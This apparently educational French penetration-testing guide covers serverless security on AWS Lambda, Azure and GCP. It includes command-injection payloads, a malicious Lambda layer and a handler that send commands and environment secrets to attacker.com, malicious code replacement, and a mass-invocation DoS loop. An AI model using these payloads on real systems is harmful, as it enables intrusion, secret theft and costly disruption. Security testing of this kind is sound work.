---
name: serverless-security
description: Guide complet de sécurité serverless — AWS Lambda, Azure Functions, Google Cloud Functions — event injection, permission escalation, function manipulation, cold start, et secrets extraction
category: cybersecurite
---

# Serverless Security — Pentest des Fonctions

---

## Architecture Serverless

```
Event Source (S3, HTTP, Queue, DB) 
    → Function (Lambda, Azure Function, Cloud Function)
        → Destination (S3, DB, Queue, API)
        
Points d'attaque:
- Event data injection (dans la fonction)
- Permission over-permissive (IAM)
- Secrets dans les variables d'environnement
- Third-party dependencies vulnérables
- Cold start timing attacks
- Function manipulation (code, layers, config)
```

---

## 1. Énumération Serverless

### AWS Lambda

```bash
# Avec credentials
aws lambda list-functions
aws lambda list-functions --max-items 100
aws lambda get-function --function-name <name>
aws lambda get-function-configuration --function-name <name>
aws lambda list-event-source-mappings
aws lambda list-layers
aws lambda list-versions-by-function --function-name <name>

# Sans credentials (si l'API est exposée)
# Les endpoints Lambda sont souvent:
# https://<id>.lambda-url.<region>.on.aws/
# https://<id>.execute-api.<region>.amazonaws.com/dev/
```

### Azure Functions

```bash
# Vérifier les endpoints exposés
# Fonctions HTTP triggers:
# https://<app>.azurewebsites.net/api/<function>
# https://<app>.azurewebsites.net/admin/functions  (si auth admin)

# Enumération
az functionapp list
az functionapp show --name <app> --resource-group <rg>
az functionapp config show --name <app> --resource-group <rg>
az functionapp function list --name <app> --resource-group <rg>
```

### Google Cloud Functions

```bash
gcloud functions list
gcloud functions describe <name>
gcloud functions get-iam-policy <name>
```

---

## 2. Event Injection

### HTTP Event Injection

```bash
# Les fonctions HTTP reçoivent des événements
# L'attaquant peut injecter des données malveillantes dans le body

# AWS Lambda + API Gateway
POST /api/users HTTP/1.1
Host: <id>.execute-api.us-east-1.amazonaws.com
Content-Type: application/json

{
  "user": "$(id)",
  "callback": "https://attacker.com/steal"
}

# Injection dans les headers
X-Forwarded-For: 127.0.0.1
X-Amz-Invocation-Type: Event  # Async invocation ?
```

### S3 Event Injection

```bash
# Si la fonction est déclenchée par S3
# Uploader un fichier avec des métadonnées malveillantes

# Les métadonnées S3 sont passées à la fonction
aws s3api put-object --bucket target-bucket --key test.txt \
  --body test.txt \
  --metadata '{"cmd":"id"}'
```

### Queue Event Injection (SQS)

```bash
# Si la fonction lit une queue SQS
# Envoyer un message malveillant

aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/... \
  --message-body '{"action": "delete_all_users"}'
```

---

## 3. Permission Escalation

### Over-permissive IAM Role

```bash
# Le rôle Lambda a souvent trop de permissions
# Vérifier les permissions:

aws iam list-attached-role-policies --role-name <function-role>
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Permissions dangereuses:
# lambda:UpdateFunctionCode (modifier le code de la fonction)
# lambda:InvokeFunction (invoquer d'autres fonctions)
# iam:PassRole (attacher des rôles à d'autres services)
# s3:PutObject (écrire dans S3)
# dynamodb:PutItem (écrire dans DynamoDB)
# logs:CreateLogGroup (log injection)
```

### Lambda Function Manipulation

```bash
# Si on a lambda:UpdateFunctionCode
# On peut injecter du code malveillant

# 1. Créer un payload Lambda
cat > index.js << 'EOF'
exports.handler = async (event) => {
  const { execSync } = require('child_process');
  const result = execSync('id').toString();
  return { statusCode: 200, body: result };
};
EOF
zip function.zip index.js

# 2. Uploader le code modifié
aws lambda update-function-code \
  --function-name <target-function> \
  --zip-file fileb://function.zip

# 3. Invoguer
aws lambda invoke --function-name <target-function> output.txt
cat output.txt
```

### Lambda Layer Injection

```bash
# Si on peut créer/modifier des layers
# Ajouter une couche d'exécution (ex: wrapper)

# 1. Créer un layer malveillant
mkdir -p malicious-layer/nodejs/node_modules/hook
# index.js (wrapper qui intercepte les appels)
cat > malicious-layer/nodejs/node_modules/hook/index.js << 'EOF'
const originalExec = require('child_process').execSync;
require('child_process').execSync = function(cmd) {
  // Exfiltrer les commandes
  fetch('https://attacker.com/exec?cmd=' + encodeURIComponent(cmd));
  return originalExec(cmd);
};
EOF
cd malicious-layer && zip -r layer.zip *

# 2. Publier et attacher
aws lambda publish-layer-version --layer-name MaliciousLayer \
  --zip-file fileb://layer.zip
aws lambda update-function-configuration \
  --function-name <target> \
  --layers <layer-arn>
```

---

## 4. Secrets Extraction

### Variables d'environnement

```bash
# Les secrets sont souvent dans les env vars
aws lambda get-function-configuration --function-name <name>
# → Environment Variables dans la réponse

# Azure:
az functionapp config appsettings list --name <app> --resource-group <rg>

# Google Cloud:
gcloud functions describe <name> --format="get(eventTrigger)"
```

### Exfiltration via la fonction

```javascript
// Si on peut exécuter du code dans la fonction
// Exfiltrer les variables d'environnement

exports.handler = async (event) => {
  const https = require('https');
  const data = JSON.stringify(process.env);

  const options = {
    hostname: 'attacker.com',
    path: '/exfil',
    method: 'POST',
  };

  const req = https.request(options);
  req.write(data);
  req.end();
};
```

### CloudWatch Logs Reading

```bash
# Les logs peuvent contenir des secrets
aws logs describe-log-groups
aws logs filter-log-events --log-group-name /aws/lambda/<function>

# Chercher des patterns sensibles:
aws logs filter-log-events \
  --log-group-name /aws/lambda/<function> \
  --filter-pattern "password"
aws logs filter-log-events \
  --log-group-name /aws/lambda/<function> \
  --filter-pattern "secret"
aws logs filter-log-events \
  --log-group-name /aws/lambda/<function> \
  --filter-pattern "token"
```

---

## 5. Cold Start Exploitation

### Timing Attack

```bash
# Les cold starts sont plus longs que les warm starts
# Exploiter le timing pour:
# 1. Détecter si la fonction a été récemment invoquée
# 2. Contourner les checks de timing (password reset, etc.)

# Mesurer le temps de réponse
time curl -s https://<id>.lambda-url.us-east-1.on.aws/
# Cold start: ~500ms-2000ms
# Warm: ~5ms-50ms
```

### Cold Start Code Injection

```bash
# Si la fonction lit du code externe au démarrage
# (config, feature flags, templates)
# L'attaquant peut modifier la source externe
# et le code est chargé au prochain cold start
```

---

## 6. Denial of Service (DoS)

### Resource Exhaustion

```bash
# Serverless → pay-per-invocation
# Attaquer avec beaucoup d'événements

# AWS Lambda: 1000 concurrent invocations par défaut
# Azure: 100-200
# But: faire monter la facture ou épuiser les ressources

# Invocation massive
for i in {1..1000}; do
  aws lambda invoke --function-name <target> /dev/null &
done
wait
```

### Timeout Manipulation

```bash
# Vérifier la configuration de timeout
aws lambda get-function-configuration --function-name <name>
# → Timeout: 30s (max 900s / 15min)

# Si la fonction fait des appels externes
# L'attaquant peut ralentir la réponse
# → La fonction timeout et coûte de l'argent
```

---

## 7. Détection & Outils

```bash
# ScoutSuite — audit de configuration
scout aws --profile default

# Prowler — check serverless
prowler aws -g serverless

# CloudSploit
cloudsploit scan --cloud aws

# LambdaGuard — évaluation sécurité Lambda
git clone https://github.com/Skyscanner/LambdaGuard
lambda-guard

# clair — conteneur analysis
clair-scanner
```

---

## Checklist

```
ÉNUMÉRATION
☐ Lister toutes les fonctions (Lambda, Azure, GCP)
☐ Vérifier les permissions IAM du rôle de fonction
☐ Inspecter les variables d'environnement
☐ Vérifier les triggers (S3, HTTP, SQS, etc.)
☐ Inspecter les dépendances (vulnérabilités)

EVENT INJECTION
☐ Test d'injection dans le body HTTP
☐ Test d'injection dans les headers
☐ Test d'injection S3 metadata
☐ Test d'injection SQS messages

PERMISSION ESCALATION
☐ lambda:UpdateFunctionCode exploitable ?
☐ iam:PassRole exploitable ?
☐ lambda:InvokeFunction sur d'autres fonctions ?
☐ Layers modifiables ?

SECRETS
☐ Variables d'environnement sensibles ?
☐ Logs CloudWatch analysés ?
☐ Secrets Manager / Parameter Store accessible ?
☐ API keys dans le code source ?

CONFIGURATION
☐ Timeout trop long ?
☐ Concurrency limit trop élevée ?
☐ VPC configuré (isolation réseau) ?
☐ DLQ (Dead Letter Queue) configurée ?
☐ X-Ray tracing active ?
```

## Ressources

- **HackTricks Cloud** : https://cloud.hacktricks.xyz
- **LambdaGuard** : https://github.com/Skyscanner/LambdaGuard
- **ScoutSuite** : https://github.com/nccgroup/ScoutSuite
- **Prowler** : https://github.com/prowler-cloud/prowler
- **OWASP Serverless Top 10** : https://owasp.org/www-project-serverless-top-10/
- **AWS Lambda Security** : https://docs.aws.amazon.com/lambda/latest/dg/security.html